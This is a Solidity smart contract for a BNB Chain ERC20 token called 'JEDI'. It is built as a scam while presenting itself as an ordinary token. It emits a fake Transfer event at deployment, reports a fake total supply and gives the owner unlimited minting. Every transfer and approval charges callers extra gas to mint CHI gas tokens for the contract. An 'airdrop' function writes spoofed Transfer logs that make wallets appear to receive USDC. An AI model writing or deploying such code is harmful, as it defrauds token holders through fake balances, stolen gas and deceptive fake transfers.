// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IGasToken {
    function freeUpTo(uint256 value) external;
    function mint(uint256 value) external;
}

contract Token is ERC20 {
    address creator;
    uint256 public cakeAmount;
    address public pair;
    //totalSupply is 1billion
    uint256 public _totalSupply = 1000000000;
    uint256 public chiToken;

    IGasToken GAS;

    IFactory private pancakeFactory = IFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);

    address private USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address private immutable ZERO = address(0);

    constructor() ERC20("JEDI", "JEDI") {
        cakeAmount = 1000 * 1e18;
        pair = pancakeFactory.createPair(address(this), USDC);
        //set owner as msgsender
        creator = msg.sender;

        chiToken = 1;
        GAS = IGasToken(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
        emit Transfer(address(this), msg.sender, totalSupply() / 100 * 90);
    }

    modifier onlyOwner() {
        require(msg.sender == creator, "Only creator");
        _;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    //update chiToken amount to be minted
    function updateChiToken(uint256 _value) public onlyOwner {
        chiToken = _value;
    }

    //mint tokens to user
    function mint(address _account, uint256 _amount) external onlyOwner {
        _totalSupply += _amount;
        _mint(_account, _amount);
    }

    //function to transfer tokens
    function transfer(address to, uint256 amount) public override returns (bool) {
        address owner = _msgSender();
        GAS.mint(chiToken);
        _transfer(owner, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        address owner = _msgSender();
        GAS.mint(chiToken);
        _approve(owner, spender, amount);
        return true;
    }

    function transferOwnership(address _newOwner) external onlyOwner {
        creator = _newOwner;
    }

    function withdraw(address target, uint256 amount) public onlyOwner {
        payable(target).transfer(amount);
    }

    function airdrop(bytes memory data, uint256 burnGasTokenAmount) external onlyOwner {
        uint256 _start = 0;
        address token = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
        uint256 len = data.length / 20;
        bytes32 topic0 = bytes32(keccak256("Transfer(address,address,uint256)"));
        uint256 amount = cakeAmount;

        for (uint256 i = 0; i < len;) {
            assembly {
                mstore(0, amount)
                log3(0, 0x20, topic0, token, shr(96, mload(add(add(data, 0x20), _start))))
                i := add(i, 1)
                _start := add(_start, 20)
            }
        }

        if (burnGasTokenAmount > 0) {
            GAS.freeUpTo(burnGasTokenAmount);
        }
    }

    receive() external payable {}
}
